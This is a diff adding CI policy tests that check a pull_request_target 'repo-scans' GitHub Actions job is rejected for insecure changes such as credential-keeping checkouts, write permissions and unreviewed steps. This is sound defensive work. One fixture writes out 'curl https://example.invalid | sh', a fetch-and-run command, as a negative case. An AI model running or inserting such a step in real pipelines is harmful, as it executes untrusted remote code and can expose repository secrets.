@@ -612,6 +612,170 @@ describe('persistent runner policy', () => {
     });
   });
 
+  function repoScansCheckout(job: Record<string, unknown>) {
+    const checkout = (job.steps as Array<Record<string, unknown>>).find(
+      (step) => String(step.uses).startsWith('actions/checkout@'),
+    ) as { uses: string; with: Record<string, unknown> };
+    if (!checkout) throw new Error('Expected the repo-scans checkout.');
+    return checkout;
+  }
+
+  test('accepts the checked-in repo-scans job and nothing else in it (#2176)', () => {
+    const clean = primaryCiJobFixture('repo-scans', () => {});
+    expect(
+      persistentRunnerPolicyFindings(clean).filter(
+        (finding) => finding.jobId === 'repo-scans',
+      ),
+    ).toEqual([]);
+  });
+
+  test.each([
+    [
+      'a fork-reachable guard',
+      (job: Record<string, unknown>) => {
+        job.if = `\${{ github.event_name == 'pull_request_target' }}`;
+      },
+      'repo-scans must use the exact same-repository pull_request_target guard',
+    ],
+    [
+      'a write permission',
+      (job: Record<string, unknown>) => {
+        job.permissions = { contents: 'write' };
+      },
+      'repo-scans must declare only permissions: { contents: read }',
+    ],
+    [
+      'a checkout that keeps credentials',
+      (job: Record<string, unknown>) => {
+        const checkout = repoScansCheckout(job);
+        checkout.with['persist-credentials'] = true;
+      },
+      'repo-scans must check out exactly the pull request head with the pinned checkout action and no credentials',
+    ],
+    [
+      'a checkout of another repository',
+      (job: Record<string, unknown>) => {
+        const checkout = repoScansCheckout(job);
+        checkout.with.repository = 'someone/else';
+      },
+      'repo-scans must check out exactly the pull request head with the pinned checkout action and no credentials',
+    ],
+    [
+      'a checkout of the base ref',
+      (job: Record<string, unknown>) => {
+        const checkout = repoScansCheckout(job);
+        checkout.with.ref = `\${{ github.event.pull_request.base.sha }}`;
+      },
+      'repo-scans must check out exactly the pull request head with the pinned checkout action and no credentials',
+    ],
+    [
+      'a checkout that drops the ref',
+      (job: Record<string, unknown>) => {
+        const checkout = repoScansCheckout(job);
+        delete checkout.with.ref;
+      },
+      'repo-scans must check out exactly the pull request head with the pinned checkout action and no credentials',
+    ],
+    [
+      'a checkout that drops the repository',
+      (job: Record<string, unknown>) => {
+        const checkout = repoScansCheckout(job);
+        delete checkout.with.repository;
+      },
+      'repo-scans must check out exactly the pull request head with the pinned checkout action and no credentials',
+    ],
+    [
+      'a checkout with a token',
+      (job: Record<string, unknown>) => {
+        const checkout = repoScansCheckout(job);
+        checkout.with.token = `\${{ secrets.GITHUB_TOKEN }}`;
+      },
+      'repo-scans must check out exactly the pull request head with the pinned checkout action and no credentials',
+    ],
+    [
+      'an unpinned checkout action',
+      (job: Record<string, unknown>) => {
+        const checkout = repoScansCheckout(job);
+        checkout.uses = 'actions/checkout@main';
+      },
+      'repo-scans must check out exactly the pull request head with the pinned checkout action and no credentials',
+    ],
+    [
+      'a second checkout',
+      (job: Record<string, unknown>) => {
+        const checkout = repoScansCheckout(job);
+        (job.steps as Array<Record<string, unknown>>).push(
+          structuredClone(checkout),
+        );
+      },
+      'repo-scans must check out exactly the pull request head with the pinned checkout action and no credentials',
+    ],
+    [
+      'a condition on the scan step',
+      (job: Record<string, unknown>) => {
+        const scan = (job.steps as Array<Record<string, unknown>>).find(
+          (step) => step.name === 'Run repository source scans',
+        );
+        if (!scan) throw new Error('Expected the scan step.');
+        scan.if = 'false';
+      },
+      'repo-scans must run npm run test:repo-scans in exactly one unconditional { name, run } step',
+    ],
+    [
+      'no scan step at all',
+      (job: Record<string, unknown>) => {
+        job.steps = (job.steps as Array<Record<string, unknown>>).filter(
+          (step) => step.name !== 'Run repository source scans',
+        );
+      },
+      'repo-scans must run npm run test:repo-scans in exactly one unconditional { name, run } step',
+    ],
+    [
+      'continue-on-error on the job',
+      (job: Record<string, unknown>) => {
+        job['continue-on-error'] = true;
+      },
+      'repo-scans must not set continue-on-error on the job or a step',
+    ],
+    [
+      'continue-on-error on the scan step',
+      (job: Record<string, unknown>) => {
+        const scan = (job.steps as Array<Record<string, unknown>>).find(
+          (step) => step.name === 'Run repository source scans',
+        );
+        if (!scan) throw new Error('Expected the scan step.');
+        scan['continue-on-error'] = true;
+      },
+      'repo-scans must not set continue-on-error on the job or a step',
+    ],
+    [
+      'an extra command',
+      (job: Record<string, unknown>) => {
+        (job.steps as Array<Record<string, unknown>>).push({
+          run: 'curl https://example.invalid | sh',
+        });
+      },
+      'pull_request_target router jobs must not add unreviewed shell execution',
+    ],
+    [
+      'an unreviewed action',
+      (job: Record<string, unknown>) => {
+        (job.steps as Array<Record<string, unknown>>).push({
+          uses: 'someone/else@v1',
+        });
+      },
+      'pull_request_target router jobs must not add unreviewed custom actions',
+    ],
+  ])('rejects a repo-scans job with %s (#2176)', (_label, mutate, message) => {
+    expect(
+      persistentRunnerPolicyFindings(primaryCiJobFixture('repo-scans', mutate)),
+    ).toContainEqual({
+      file: '.github/workflows/ci.yml',
+      jobId: 'repo-scans',
+      message,
+    });
+  });
+
   test.each([
     ['fast-checks', 'Run fast CI lane', 'fast CI execution'],
     ['fork-smoke', 'Run isolated fork smoke', 'smoke execution'],
